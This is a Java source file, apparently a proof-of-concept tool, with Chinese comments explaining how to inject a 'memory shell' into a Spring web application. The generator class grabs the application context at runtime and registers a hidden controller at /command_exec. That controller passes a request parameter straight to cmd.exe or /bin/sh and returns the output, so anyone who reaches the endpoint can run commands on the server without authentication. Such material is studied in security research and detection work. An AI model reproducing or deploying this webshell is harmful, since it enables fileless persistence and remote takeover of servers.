package org.vul.poc;

import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Method;

public class ControllerMemShellGenerator {
    // Controller 内存马其实就三个要点
    // 1. 在不使用注解和修改配置文件的情况下，使用纯 Java 代码来获取代码执行的上下文环境
    // 2. 在不使用注解和修改配置文件的情况下，使用纯 Java 代码在上下文环境中手动注册一个 Controller
    // 3. 在 Controller 中写入 Webshell
    //
    // 实际操作起来：
    // 1. 获取上下文环境， 即 WebApplicationContext
    // 2. 创建 MemShellController
    // 3. 将 MemShellController 注册到上下文中

    private WebApplicationContext context;
    private Class controllerClass;

    public ControllerMemShellGenerator() {
        try {
            // 1. 获取上下文环境， 即 WebApplicationContext
            getContext();
            // 2. 创建 MemeShellController
            controllerClass = MemShellController.class;
            // 3. 将 MemShellController 注册到上下文中
            registerEvilController();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public WebApplicationContext getContext() {
        // 获取上下文环境
        // context = ContextLoader.getCurrentWebApplicationContext();
        context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        return context;
    }

    public void registerEvilController() throws Exception {
        // 使用 registerMapping 来进行注册

        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 2. 通过反射获取将自定义的 Controller 中的 method
        Method command_exec_method = controllerClass.getDeclaredMethod("command_exec", HttpServletRequest.class, HttpServletResponse.class);
        // 3. 定义访问 Controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/command_exec");
        // 4. 定义允许访问 controller 的HTTP 方法 get/post
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 生成 requestMappingInfo
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        // 6. 注册
        // controllerClass.getConstructor().newInstance();
        // 内部类使用 newInstance 会有问题， 所以直接 new 了。 https://stackoverflow.com/questions/25634542/newinstance-with-inner-classes
        r.registerMapping(info, new MemShellController(), command_exec_method);
    }

    class MemShellController {
        public MemShellController() {

        }
        public void command_exec(HttpServletRequest request, HttpServletResponse response) {
            try {
                String arg0 = request.getParameter("code");
                PrintWriter writer = response.getWriter();
                if (arg0 != null) {
                    String o = "";
                    java.lang.ProcessBuilder p;
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                    } else {
                        p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                    }
                    java.util.Scanner c = new java.util.Scanner(p.start().getInputStream());
                    o = c.hasNext() ? c.next() : o;
                    c.close();
                    writer.write(o);
                    writer.flush();
                    writer.close();
                } else {
                    response.sendError(404);
                }
            } catch (Exception e) {
            }
        }
    }

}
